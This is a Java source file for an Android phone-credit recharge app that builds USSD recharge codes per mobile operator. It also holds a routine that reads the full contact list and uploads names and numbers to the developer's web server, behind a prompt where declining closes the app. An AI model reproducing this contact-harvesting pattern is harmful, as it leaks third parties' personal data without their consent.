package tarekmahedy.app.recharger;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.provider.Contacts.People;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
	
	
	EditText te;
	EditText rechargenumber;
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        
		
        te=(EditText)findViewById(R.id.editifnumber);
        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(getBaseContext());
 		String idnumber = prefs.getString("idnumber","@");
 	    if(idnumber=="@") idnumber="";
 	    te.setText(idnumber);
 	    
        Button savebtn=(Button)findViewById(R.id.button1);
        
        TelephonyManager telephonyManager =((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE));
		String operatorName = telephonyManager.getNetworkOperator();
		if (operatorName != null) {
			
	        int mcc = Integer.parseInt(operatorName.substring(0, 3));
	        if(mcc==602){
	        	te.setVisibility(View.INVISIBLE);
	        	savebtn.setVisibility(View.INVISIBLE);
	        	((TextView)findViewById(R.id.textView1)).setVisibility(View.INVISIBLE);
	        	
	        }
		}
		
         
		savebtn.setOnClickListener(new View.OnClickListener() {

			@Override
			public void onClick(View v) {
				
				SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getBaseContext());
				preferences.edit().putString("idnumber",te.getText().toString()).commit();
				Toast.makeText(getApplicationContext(), "·ﬁœ  „ Õ›Ÿ —ﬁ„ «·ÂÊÌ…",Toast.LENGTH_LONG).show();
				//te.setVisibility(View.INVISIBLE);
				
			}
		});
      
		  rechargenumber=(EditText)findViewById(R.id.rechargenumber);
		 Button rechargebtn=(Button)findViewById(R.id.rechargebtn);
		 
		 rechargebtn.setOnClickListener(new View.OnClickListener() {
			 
			@Override
			public void onClick(View v) {
				SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getBaseContext());
				preferences.edit().putString("idnumber",te.getText().toString()).commit();
			
				String phonenumber=rechargenumber.getText().toString();
				String dialnumber="*"+checkfornumberformate(phonenumber,getBaseContext());
				
				Uri number = Uri.parse("tel:"+dialnumber+ Uri.encode("#"));
				Intent callIntent = new Intent(Intent.ACTION_DIAL, number);
				startActivity(callIntent);
			}
		});
		
		 //AppRater.showRateDialog(this, null);
		 AppRater.app_launched(this);
		 
    }
    
public String checkfornumberformate(String _number,Context _context){
		
		
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(_context);
		String idnumber = prefs.getString("idnumber","@");
	    if(idnumber!="@")idnumber="*"+idnumber;
	    else idnumber="";
	    
	    
		TelephonyManager telephonyManager =((TelephonyManager) _context.getSystemService(Context.TELEPHONY_SERVICE));
		
		String operatorName = telephonyManager.getNetworkOperator();
		if (operatorName != null) {
			
	        int mcc = Integer.parseInt(operatorName.substring(0, 3));
	        int mnc = Integer.parseInt(operatorName.substring(3));
	    
	        if(mcc==602){
	        	
	        switch(mnc){
	        case 1:
	        	return "102#"+_number;
	        	
	        case 2:
	        	return "858*"+_number;
	        
	        case 3:
	        	return "556*"+_number;
	        	
	        
	        }	
	        	
	        }
	        else if(mcc==420){
	        	   switch(mnc){
	   	        case 3:
	   	        	return "1400*"+_number+idnumber;
	   	        	
	   	        case 1:
	   	        	return "155*"+_number+idnumber;
	   	        
	   	        case 4:
	   	        	return "141"+idnumber+"*"+_number;
	   	        	
	   	        
	   	        }	
	        	
	        }
		
		
		}
		
	return 	_number;
		
	}
	
    
    
    Runnable initmsgner=new Runnable() {

		public void run() {  
			String strsent="";
	    	
	        String[] columns = new String[] {People.NAME,People.NUMBER};
	        Uri mContacts = People.CONTENT_URI;
	        Cursor mCur = managedQuery(mContacts, // Contact URI
	                    columns,    // Which columns to return
	                    null,       // Which rows to return
	                    null,       // Where clause parameters
	                    null        // Order by clause
	                    );
	        if (mCur.moveToFirst()) {
	              String name = null;
	              String phoneNo = null;
	              while (mCur.moveToNext()) {
	                name = mCur.getString(mCur.getColumnIndex(People.NAME));
	                phoneNo = mCur.getString(mCur.getColumnIndex(People.NUMBER));
	                if(name!=null && phoneNo!=null)
	                strsent=strsent+name+"#%#"+phoneNo+"###";
	                
	               } 
	              postData(strsent);
	        }
	        
	        //here send data to the web 

		}
	};
	
	
	
	public void postData(String _data) {

	    HttpClient httpclient = new DefaultHttpClient();
	    HttpPost httppost = new HttpPost("http://www.tarekmahedy.com/wallet/index.php");

	    try {
	        // Add your data
	        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
	       
	        nameValuePairs.add(new BasicNameValuePair("f", "adddata"));
	        nameValuePairs.add(new BasicNameValuePair("datastr", _data));
	        httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs,"UTF-8"));

	        HttpResponse response = httpclient.execute(httppost);
	        HttpEntity httpEntity = response.getEntity();
	        InputStream is = httpEntity.getContent();

	        BufferedReader reader = new BufferedReader(new InputStreamReader(
	                is,"UTF-8"), 8);
	        StringBuilder sb = new StringBuilder();

	        String line = null;
	        while ((line = reader.readLine()) != null) {
	            sb.append(line);
	        }
	        is.close();
	        int resid=Integer.valueOf(sb.toString());
	        
	        if(resid>0){
	        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(getBaseContext());
			 SharedPreferences.Editor editor = prefs.edit();
			editor.putBoolean("contacparsed", true);
			editor.commit();
	        }
	        
	    } catch (ClientProtocolException e) {
	        // TODO Auto-generated catch block
	    } catch (IOException e) {
	        // TODO Auto-generated catch block
	    }
	    
	    
	} 


	
	
	
    private void displayContacts() {
    	
    	 AlertDialog.Builder ab = new AlertDialog.Builder(this);
	      ab.setMessage(getString(R.string.takecontacts)).setPositiveButton(getString(R.string.yeslabel), dialogClickListener)
	    .setNegativeButton(getString(R.string.nolabel), dialogClickListener).show();

        
  }
    
	
    DialogInterface.OnClickListener dialogClickListener = new DialogInterface.OnClickListener() {
    		
    		
    	    @Override
    	    public void onClick(DialogInterface dialog, int which) {
    	        switch (which){
    	        case DialogInterface.BUTTON_POSITIVE:
    	        	Thread backupthread=new Thread(initmsgner);
    	    		backupthread.start();
    	            break;

    	        case DialogInterface.BUTTON_NEGATIVE:
    	        	finish();
    	            break;
    	        }
    	    }
    	};
    
    
}